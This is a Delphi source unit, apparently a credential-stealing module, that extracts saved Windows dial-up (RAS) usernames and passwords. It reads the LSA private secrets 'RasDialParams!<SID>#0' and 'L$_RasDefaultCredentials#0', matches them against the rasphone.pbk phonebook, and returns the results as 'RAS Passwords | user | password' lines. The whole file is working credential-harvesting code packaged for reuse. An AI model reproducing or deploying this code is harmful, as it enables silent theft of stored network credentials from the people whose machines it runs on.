unit uRASReader;
//////////////////////////////////////////////////
// Автор:  (C) Alex Demchenko (coban2k@mail.ru)
//            http://www.cobans.net
////////
// Доработано: VTZLab
// http://agcoders.myrunet.com
//////////////////////////////////////////////////
interface

uses
 Windows;

function GetLoginPass:string;

implementation

const
  POLICY_VIEW_LOCAL_INFORMATION = 1;
  POLICY_VIEW_AUDIT_INFORMATION = 2;
  POLICY_GET_PRIVATE_INFORMATION = 4;
  POLICY_TRUST_ADMIN = 8;
  POLICY_CREATE_ACCOUNT = 16;
  POLICY_CREATE_SECRET = 32;
  POLICY_CREATE_PRIVILEGE = 64;
  POLICY_SET_DEFAULT_QUOTA_LIMITS = 128;
  POLICY_SET_AUDIT_REQUIREMENTS = 256;
  POLICY_AUDIT_LOG_ADMIN = 512;
  POLICY_SERVER_ADMIN = 1024;
  POLICY_LOOKUP_NAMES = 2048;
  POLICY_NOTIFICATION = 4096;
  POLICY_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or POLICY_VIEW_LOCAL_INFORMATION or POLICY_VIEW_AUDIT_INFORMATION or POLICY_GET_PRIVATE_INFORMATION or POLICY_TRUST_ADMIN or POLICY_CREATE_ACCOUNT or POLICY_CREATE_SECRET or POLICY_CREATE_PRIVILEGE or POLICY_SET_DEFAULT_QUOTA_LIMITS or POLICY_SET_AUDIT_REQUIREMENTS or POLICY_AUDIT_LOG_ADMIN or POLICY_SERVER_ADMIN or POLICY_LOOKUP_NAMES);
  POLICY_READ = (STANDARD_RIGHTS_READ or POLICY_VIEW_AUDIT_INFORMATION or POLICY_GET_PRIVATE_INFORMATION);
  POLICY_WRITE = (STANDARD_RIGHTS_WRITE or POLICY_TRUST_ADMIN or POLICY_CREATE_ACCOUNT or POLICY_CREATE_SECRET or POLICY_CREATE_PRIVILEGE or POLICY_SET_DEFAULT_QUOTA_LIMITS or POLICY_SET_AUDIT_REQUIREMENTS or POLICY_AUDIT_LOG_ADMIN or POLICY_SERVER_ADMIN);
  POLICY_EXECUTE = (STANDARD_RIGHTS_EXECUTE or POLICY_VIEW_LOCAL_INFORMATION or POLICY_LOOKUP_NAMES);
  RASBASE = 600;
  ERROR_BUFFER_TOO_SMALL = (RASBASE+3);
type
  Stroks = record
    Name,Value:string;
  end;

  PLSA_UNICODE_STRING = ^LSA_UNICODE_STRING;
  LSA_UNICODE_STRING = packed record
    Length: WORD;
    MaximumLength: WORD;
    Buffer: PWCHAR;
  end;

  PLSA_OBJECT_ATTRIBUTES = ^LSA_OBJECT_ATTRIBUTES;
  LSA_OBJECT_ATTRIBUTES = packed record
    Length: LongWord;
    RootDirectory: THandle;
    ObjectName: PLSA_UNICODE_STRING;
    Attributes: LongWord;
    SecurityDescriptor: Pointer;
    SecurityQualityOfService: Pointer;
  end;

  TRasEntryName = record
    dwSize: Longint;
    szEntryName: Array[0..256] of AnsiChar;
  end;

  LPRasEntryNameA = ^TRasEntryName;

  TRasDialParams = record
    dwSize: LongInt;
    szEntryName: Array[0..256] of AnsiChar;
    szPhoneNumber: Array[0..128] of AnsiChar;
    szCallbackNumber: Array[0..128] of AnsiChar;
    szUserName: Array[0..256] of AnsiChar;
    szPassword: Array[0..256] of AnsiChar;
    szDomain: Array[0..15] of AnsiChar;
{$IFDEF WINVER41}
    dwSubEntry: Longint;
    dwCallbackId: Longint;
{$ENDIF}
  end;

  TRasIPAddr = record
    a, b, c, d: Byte;
  end;

  TRasEntry = record
    dwSize,
    dwfOptions,
    // Location/phone number.
    dwCountryID,
    dwCountryCode: Longint;
    szAreaCode: array[0.. 10] of AnsiChar;
    szLocalPhoneNumber: array[0..128] of AnsiChar;
    dwAlternatesOffset: Longint;
    // PPP/Ip
    ipaddr,
    ipaddrDns,
    ipaddrDnsAlt,
    ipaddrWins,
    ipaddrWinsAlt: TRasIPAddr;
    // Framing
    dwFrameSize,
    dwfNetProtocols,
    dwFramingProtocol: Longint;
    // Scripting
    szScript: Array[0..MAX_PATH - 1] of AnsiChar;
    // AutoDial
    szAutodialDll: Array [0..MAX_PATH - 1] of AnsiChar;
    szAutodialFunc: Array [0..MAX_PATH - 1] of AnsiChar;
    // Device
    szDeviceType: Array [0..16] of AnsiChar;
    szDeviceName: Array [0..128] of AnsiChar;
    // X.25
    szX25PadType: Array [0..32] of AnsiChar;
    szX25Address: Array [0..200] of AnsiChar;
    szX25Facilities: Array [0..200] of AnsiChar;
    szX25UserData: Array [0..200] of AnsiChar;
    dwChannels: Longint;
    // Reserved
    dwReserved1,
    dwReserved2: Longint;
{$IFDEF WINVER41}
    // Multilink
    dwSubEntries,
    dwDialMode,
    dwDialExtraPercent,
    dwDialExtraSampleSeconds,
    dwHangUpExtraPercent,
    dwHangUpExtraSampleSeconds: Longint;
    // Idle timeout
    dwIdleDisconnectSeconds: Longint;
{$ENDIF}
  end;

  function ConvertSidToStringSid(sid: Pointer; var StringSid: PChar): BOOL; stdcall;external 'advapi32.dll' name 'ConvertSidToStringSidA';
  function LsaOpenPolicy(SystemName: PLSA_UNICODE_STRING; ObjectAttributes: PLSA_OBJECT_ATTRIBUTES; DesiredAccess: LongWord; PolicyHandle: PLongWord): LongWord; stdcall;external 'advapi32.dll' name 'LsaOpenPolicy';
  function LsaRetrievePrivateData(LSA_HANDLE: LongWord; KeyName: PLSA_UNICODE_STRING; PrivateData: PLSA_UNICODE_STRING): LongWord; stdcall;external 'advapi32.dll' name 'LsaRetrievePrivateData';
  function LsaClose(ObjectHandle: LongWord): LongWord; stdcall;external 'advapi32.dll' name 'LsaClose';
  function LsaFreeMemory(Buffer: Pointer): LongWord; stdcall;external 'advapi32.dll' name 'LsaFreeMemory';
  function LsaStorePrivateData(LSA_HANDLE: LongWord; KeyName: PLSA_UNICODE_STRING; var PrivateData: LSA_UNICODE_STRING): LongWord; stdcall;external 'advapi32.dll' name 'LsaStorePrivateData';
  function SHGetSpecialFolderPath(hwndOwner: HWND; lpszPath: PChar; nFolder: Integer; fCreate: BOOL): BOOL; stdcall; external 'shell32.dll' name 'SHGetSpecialFolderPathA';
  function RasEnumEntries(reserved: PAnsiChar;lpszPhoneBook: PAnsiChar;entrynamesArray:LPRasEntryNameA;var lpcb: Longint;var lpcEntries: Longint): Longint; stdcall;external 'rasapi32.dll' name 'RasEnumEntriesA';
  function RasGetEntryDialParams(lpszPhoneBook: PChar;var lpDialParams: TRasDialParams;var lpfPassword: LongBool): Longint; stdcall;external 'rasapi32.dll' name 'RasGetEntryDialParamsA';

var
  rnaph_initialized: Boolean = False;
  is_rnaph: Boolean = False;
  lib: HModule;
  FLSAList:array[0..255] of Stroks;

//////////////////////
// Получение пароля //
//////////////////////
procedure ProcessLSABuffer(Buffer: PWideChar; BufLen: LongWord);
var
 c: Char;
 q,i,SPos: Integer;
 S,BookID: String;
begin
  S := ''; SPos := 0; BookID := '';q:=0;
  for i := 0 to BufLen div 2 - 2 do begin
    c := WideCharLenToString(@Buffer[i], 1)[1];
    if c = #0 then begin
      SPos := SPos + 1;
      case SPos of
        1: BookID := S;
        7: if S <> '' then
           begin
             FLSAList[q].Name:=BookID;
             FLSAList[q].Value:=S;
           end;
      end;
      S := '';
    end else
      S := S + c;
    if SPos = 9 then
    begin
      inc(q);
      BookID := '';
      SPos := 0;
    end;
  end;
end;

function GetLocalSid: String;
var
  UserName: String;
  UserNameSize, SidSize, DomainSize: Cardinal;
  sid, domain: array[0..255] of Char;
  snu: SID_NAME_USE;
  pSid: PChar;
begin
  Result := '';
  { Local User Name }
  SetLength(UserName, 256);
  UserNameSize := 255;
  if not GetUserName(@UserName[1], UserNameSize) then Exit;
  { Find a security identificator (sid) for local user }
  SidSize := 255;
  DomainSize := 255;
  if not LookupAccountName(nil, @UserName[1], @sid, SidSize, @domain, DomainSize, snu) then Exit;
  if not IsValidSid(@sid) then Exit;
  { Convert sid to string }
  ConvertSidToStringSid(@sid, pSid);
  Result := pSid;
  GlobalFree(Cardinal(pSid));
end;

procedure AnsiStringToLsaStr(const AValue: String; var LStr: LSA_UNICODE_STRING);
begin
  LStr.Length := Length(AValue) shl 1;
  LStr.MaximumLength := LStr.Length+2;
  GetMem(LStr.Buffer, LStr.MaximumLength);
  StringToWideChar(AValue, LStr.Buffer, LStr.MaximumLength);
end;

function GetLsaData(Policy: LongWord; const KeyName: String; var OutData: PLSA_UNICODE_STRING): Boolean;
var
  LsaObjectAttribs: LSA_OBJECT_ATTRIBUTES;
  LsaHandle: LongWord;
  LsaKeyName: LSA_UNICODE_STRING;
begin
  Result := False;
  FillChar(LsaObjectAttribs, SizeOf(LsaObjectAttribs), 0);
  if LsaOpenPolicy(nil, @LsaObjectAttribs, Policy, @LsaHandle) > 0 then Exit;
  AnsiStringToLsaStr(KeyName, LsaKeyName);
  Result := LsaRetrievePrivateData(LsaHandle, @LsaKeyName, @OutData) = 0;
  FreeMem(LsaKeyName.Buffer);
  LsaClose(LsaHandle);
end;

procedure GetLSAPasswords;
var
  PrivateData: PLSA_UNICODE_STRING;
begin
  if GetLsaData(POLICY_GET_PRIVATE_INFORMATION,'RasDialParams!'+GetLocalSid+'#0',PrivateData) then
  begin
    ProcessLSABuffer(PrivateData.Buffer, PrivateData.Length);
    LsaFreeMemory(PrivateData.Buffer);
  end;
  if GetLsaData(POLICY_GET_PRIVATE_INFORMATION, 'L$_RasDefaultCredentials#0', PrivateData) then
  begin
    ProcessLSABuffer(PrivateData.Buffer, PrivateData.Length);
    LsaFreeMemory(PrivateData.Buffer);
  end;
end;

////////////////////////////////////////
// Работа с книжками и записями в них //
////////////////////////////////////////

function MakePhoneBookPath(const Value: String): String;//Делаем путь к книжке
begin
  Result:=Value+#0;
  SetLength(Result, lstrlen(@Result[1]));
  if Result[Length(Result)+1]<>'\' then  Result:=Result+ '\';
  Result:=Result+'Microsoft\Network\Connections\pbk\rasphone.pbk';
end;

function GetRasEntryCount: Cardinal;//Считаем колиество записей в книге
var
  SizeOfRasEntryName, Ret, Count: integer;//: Cardinal;
  RasEntry: TRasEntryName;
begin
  SizeOfRasEntryName := sizeof(TRasEntryName);
  RasEntry.dwSize := SizeOfRasEntryName;
  Ret:=RasEnumEntries(nil, nil,@RasEntry,SizeOfRasEntryName,Count);
  if (Ret = ERROR_BUFFER_TOO_SMALL) or (Ret = 0) then Result:=Count else Result:=0;
end;

function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
asm
        PUSH    EDI
        PUSH    ESI
        PUSH    EBX
        MOV     ESI,EAX
        MOV     EDI,EDX
        MOV     EBX,ECX
        XOR     AL,AL
        TEST    ECX,ECX
        JZ      @@1
        REPNE   SCASB
        JNE     @@1
        INC     ECX
@@1:    SUB     EBX,ECX
        MOV     EDI,ESI
        MOV     ESI,EDX
        MOV     EDX,EDI
        MOV     ECX,EBX
        SHR     ECX,2
        REP     MOVSD
        MOV     ECX,EBX
        AND     ECX,3
        REP     MOVSB
        STOSB
        MOV     EAX,EDX
        POP     EBX
        POP     ESI
        POP     EDI
end;

function rnaph_(const func: String): Pointer;
begin
  result:=nil;
  if not rnaph_initialized then
    begin
    // Try first with RASAPI32.DLL
    lib := LoadLibrary('rasapi32.dll');
    if lib <> 0 then
      begin
      Result := GetProcAddress(lib, PChar(func + 'A'));
      if Result <> nil then
        begin
        rnaph_initialized := True;
        Exit;
        end;
      end
    else
    // function not found - try rnaph.dll
    lib := LoadLibrary('rnaph.dll');
    if lib <> 0 then
      begin
        Result := GetProcAddress(lib, PChar(func));
        if Result <> nil then
        begin
          rnaph_initialized := True;
          is_rnaph := True;
          Exit;
        end;
      end;
    end
  else
    begin
    if is_rnaph then
      Result := GetProcAddress(lib, PChar(func))
    else
      Result := GetProcAddress(lib, PChar(func + 'A'));
    end;
end;


function RasGetEntryProperties(lpszPhonebook, szEntry: PAnsiChar; lpbEntry: Pointer;
    var lpdwEntrySize: Longint; lpbDeviceInfo: Pointer;
    var lpdwDeviceInfoSize: Longint): Longint;
var
 f: function(lpszPhonebook, szEntry: PAnsiChar; lpbEntry: Pointer;
 var lpdwEntrySize: Longint; lpbDeviceInfo: Pointer;var lpdwDeviceInfoSize: Longint): Longint; stdcall;
begin
  @f := rnaph_('RasGetEntryProperties');
  Result := f(lpszPhonebook, szEntry, lpbEntry, lpdwEntrySize, lpbDeviceInfo, lpdwDeviceInfoSize);
end;

function GetLoginPass:string;
var
  RasArraySize,DevInfo,RasCount: Integer;
  RasArray: array of TRasEntryName;
  Book1, Book2: String;
  osi: OSVersionInfo;
  i,q: Integer;
  RasParams: TRasDialParams;
  RasGetPassBool: Bool;
  RasEntryProperties: TRasEntry;
  Name1, Name2, szTemp: String;
  DialParamsUID: Cardinal;
begin
  result:='';
  RasCount := GetRasEntryCount;//Считаем записи
  if RasCount = 0 then Exit;
  SetLength(RasArray, RasCount);                  //Устанавливаем размер массива записей
  RasArray[0].dwSize := SizeOf(TRasEntryName);   //Размерность одной записи
  RasArraySize := RasCount * RasArray[0].dwSize;//Размерность всех записей
  if RasEnumEntries(nil, nil, @RasArray[0], RasArraySize, RasCount) <> 0 then  Exit;//Получаем имена всех записей
  {Получаем версию ОС}
  osi.dwOSVersionInfoSize := sizeof(OSVERSIONINFO);
  GetVersionEx(osi);
  {Устанавливаем длину двух строк}
  SetLength(Book1, MAX_PATH+1);
  SetLength(Book2, MAX_PATH+1);
  {Если нашли ХР}
  if (osi.dwPlatformId = VER_PLATFORM_WIN32_NT) and (osi.dwMajorVersion >= 5) then
  begin
    { Local telephone book }
    //CSIDL_APPDATA ($1a)
    //A typical path is C:\Documents and Settings\<username>\Application Data
    //in Italiano и C:\Documents and Settings\<username>\Dati Applicazioni
    if SHGetSpecialFolderPath(0,@Book1[1],$1a,False) then Book1:=MakePhoneBookPath(Book1);

    { Shared telephone book }
    //CSIDL_COMMON_APPDATA ($23)
    //A typical path is C:\Documents and Settings\All Users\Application Data
    //in Italiano и C:\Documents and Settings\All Users\Dati Applicazioni
    if SHGetSpecialFolderPath(0,@Book2[1],$23,False) then Book2:=MakePhoneBookPath(Book2);

    GetLSAPasswords;//Получаем паролики...
  end;

  RasGetPassBool := True;
  for i := 0 to RasCount-1 do begin
    RasParams.dwSize := sizeof(TRASDIALPARAMS);
    Move(RasArray[i].szEntryName, RasParams.szEntryName, 256);
    RasGetEntryDialParams(nil, RasParams, RasGetPassBool);

    RasArraySize := sizeof(TRASENTRY);
    FillChar(RasEntryProperties, RasArraySize, 0);
    RasEntryProperties.dwSize := RasArraySize;
    RasGetEntryProperties(nil, RasArray[i].szEntryName,@RasEntryProperties,RasArraySize,nil,DevInfo);
    if (osi.dwPlatformId = VER_PLATFORM_WIN32_NT) and (osi.dwMajorVersion >= 5) and ((Book1[1] <> #0) or (Book2[1] <> #0)) then begin
      Name1 := PChar(@RasParams.szEntryName[0]);
      Name2 := AnsiToUtf8(Name1);
      { Read ini-file entry }
      DialParamsUID := GetPrivateProfileInt(PChar(Name1), 'DialParamsUID', 0, @Book1[1]);
      if DialParamsUID = 0 then DialParamsUID := GetPrivateProfileInt(PChar(Name1), 'DialParamsUID', 0, @Book2[1]);
      if DialParamsUID = 0 then DialParamsUID := GetPrivateProfileInt(PChar(Name2), 'DialParamsUID', 0, @Book1[1]);
      if DialParamsUID = 0 then DialParamsUID := GetPrivateProfileInt(PChar(Name2), 'DialParamsUID', 0, @Book2[1]);
      if DialParamsUID > 0 then
      begin
        str(DialParamsUID,szTemp);
        for q:=0 to 255 do if (FLSAList[q].Name=szTemp) and (FLSAList[q].Value<>'') then StrLCopy(@RasParams.szPassword, PChar(FLSAList[q].Value), Length(FLSAList[q].Value));
      end;
    end;
    //Result:=Result+'Login('+PChar(@RasParams.szUserName)+'):Pass('+PChar(@RasParams.szPassword)+'); ';
//    Result:=Result+
//            '<'+PChar(@RasParams.szEntryName)+'>:  '+
//            '<'+PChar(@RasParams.szUserName)+'>:  '+
//            '<'+PChar(@RasParams.szPassword)+'>:  '+
//            '<'+PChar(@RasEntryProperties.szLocalPhoneNumber)+'>:  '+
//            '<'+PChar(@RasEntryProperties.szDeviceName)+'>:  '+
//            '<'+PChar(@RasEntryProperties.szDeviceType)+'>'+#13#10;
    if (pchar(@RasParams.szUserName) <> '') and (pchar(@RasParams.szPassword) <> '') then
    Result := Result +
              'RAS Passwords |' +
              PChar(@RasParams.szUserName)+' |'+
              PChar(@RasParams.szPassword)+' |'+ #13#10;
  end;
end;

end.
